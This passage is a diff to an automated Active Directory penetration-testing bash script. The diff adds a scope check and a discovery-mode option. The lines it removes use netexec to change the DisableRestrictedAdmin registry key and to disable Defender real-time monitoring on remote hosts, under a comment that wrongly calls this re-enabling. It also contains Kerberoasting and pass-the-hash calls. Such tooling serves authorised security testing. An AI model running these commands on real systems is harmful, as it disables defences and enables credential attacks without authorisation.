-							echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x1 /f'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
-						fi
-						
-						#Re-enabling RealTimeMonitoring
-						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'powershell Set-MpPreference -DisableRealTimeMonitoring $true' < /dev/null
-						
 					fi
 				fi
 			fi
@@ -1192,24 +1373,26 @@ smb () {
 
 web () {
 	# Parcourir le fichier Nmap
-	log "[🔍] Check Web Servers ..."
+	log "[🔍] Checking Web Servers ..."
 	while IFS= read -r line; do
 		if [[ $line == "Nmap scan report for"* ]]; then
 			# Extraire l'adresse IP
 			ip=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
 			hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
 		elif [[ $line =~ ^([0-9]+)/tcp ]]; then
-			# Extract port number and protocol
-			port="${BASH_REMATCH[1]}"
-			if [[ $line =~ (http|https) && ! $line =~ ncacn_http && $port != "5985" && $port != "5357" ]]; then
-			  whatweb ${ip}:${port} --log-brief=/tmp/whatweb >/dev/null 2>&1
-			  HTTPServer=$(cat /tmp/whatweb | grep -oP 'HTTPServer\[\K[^\]]+')
-			  Title=$(cat /tmp/whatweb | grep -oP 'Title\[\K[^\]]+' || echo "No title identified")
-			  green_log "${SPACE}${ip}:${port} ($hostname) -> ${HTTPServer} /// ${Title}"
-			  rm /tmp/whatweb
+			if control_ip_attack; then
+				# Extract port number and protocol
+				port="${BASH_REMATCH[1]}"
+				if [[ $line =~ (http|https) && ! $line =~ ncacn_http && $port != "5985" && $port != "5357" ]]; then
+				  whatweb ${ip}:${port} --log-brief=/tmp/whatweb >/dev/null 2>&1
+				  HTTPServer=$(cat /tmp/whatweb | grep -oP 'HTTPServer\[\K[^\]]+')
+				  Title=$(cat /tmp/whatweb | grep -oP 'Title\[\K[^\]]+' || echo "No title identified")
+				  green_log "${SPACE}${ip}:${port} ($hostname) -> ${HTTPServer} /// ${Title}"
+				  rm /tmp/whatweb
+				fi
+				# Ajouter l'IP à son fichier correspondant
+				#echo "$ip" >> "${DIR_PORTS}/${port}.txt"
 			fi
-			# Ajouter l'IP à son fichier correspondant
-			#echo "$ip" >> "${DIR_PORTS}/${port}.txt"
 		fi
 	done < "$DIR/scan_nmap/scan_Fast_TCP.nmap"
 }
@@ -1280,7 +1463,7 @@ krb () {
 		DC_host="$(echo $hostname | cut -d '.' -f 1)"
 		domain=$(echo "$hostname" | cut -d '.' -f 2-)
 		mkdir $DIR_VULNS/krb
-		log "[🔍] Check for SPN users (kerberoast) ..."
+		log "[🔍] Checking SPN users (kerberoast) ..."
 		if [[ "$Username" != "anonymous" ]]; then
 			if [ -n "$NT_Hash" ]; then
 				$proxychains impacket-getTGT -hashes ":${NT_Hash}" $domain/$Username -dc-ip $DC_host > /dev/null 2>&1
@@ -1377,18 +1560,19 @@ declare -a functions_long_names=("Ports scan, Service versions scan (need to be 
 
 ###################		 HELP 	##############################
 Help() {
-    echo "Usage: $0 -o ProjectName -i Interface -t rangeIP [-u Username [-p Password | -n NT_Hash]] -f"
+    echo "Usage: $0 -o ProjectName -i Interface -t rangeIP [-u Username [-p Password | -n NT_Hash]] [-f | -e nmap_fast | -s smb,vnc] [-m [basic | no-ping]]"
     echo
     echo "Options:"
     echo "  -o  Project name (output directory)"
     echo "  -i  Network interface"
-    echo "  -t  IP range (e.g., 192.168.1.17/32 or 192.168.1.128/27)"
+    echo "  -t  IP range (e.g., 192.168.0.0/24,192.168.1.128/27). /32 must be used for individual IP addresses."
     echo "  -u  Username (optional)"
     echo "  -p  Password (optional, either Password or NT_Hash must be provided, can be empty)"
     echo "  -H  NTLM Hash (optional, either Password or NT_Hash must be provided, can be empty)"
     echo "  -f  Execute all functions"
     echo "  -e  Execute all functions, but exclude specific functions (-e rdp,winrm)"
     echo "  -s  Select specific functions (-s rdp,winrm)"
+    echo "  -m  Discovery mode : basic=ARP+ping(faster)(Default mode) ; no-ping=no ping requests on machines(slower but more accurate)"
     echo "  -r  Restore modifications"
     echo "  -h  Display help"
     echo
@@ -1399,7 +1583,7 @@ Help() {
     exit 1
 }
 
-while getopts "o:i:u:p:H:t:e:s:fhr" option; do
+while getopts "o:i:u:p:H:t:e:s:m:fhr" option; do
     case $option in
         o) ProjectName=$OPTARG;;
         i) INTERFACE=$OPTARG;;
@@ -1410,6 +1594,7 @@ while getopts "o:i:u:p:H:t:e:s:fhr" option; do
         f) execute_all=true;;
         e) excluded_funcs=$OPTARG;;
         s) selected_funcs=$OPTARG;;
+		m) discovery_mode=$OPTARG;;
         r) restore=true;;
         h) Help;;
         \?) echo "Erreur : Option invalide"; Help;;
@@ -1426,6 +1611,14 @@ fi
 # Check Password / NT_Hash
 if [[ -n "$Password" && -n "$NT_Hash" ]]; then
     echo "Error : You can't set Password and NTLMHash in the same time."
+    exit 1
+fi
+
+#If discovery_mode is not defined
+if [[ -z "$discovery_mode" || "$discovery_mode" == "basic" ]]; then
+    discovery_mode="arp-ping"
+elif [[ "$discovery_mode" != "no-ping" ]]; then
+    echo "Error : discovery_mode must be 'basic' or 'no-ping'."
     exit 1
 fi
 
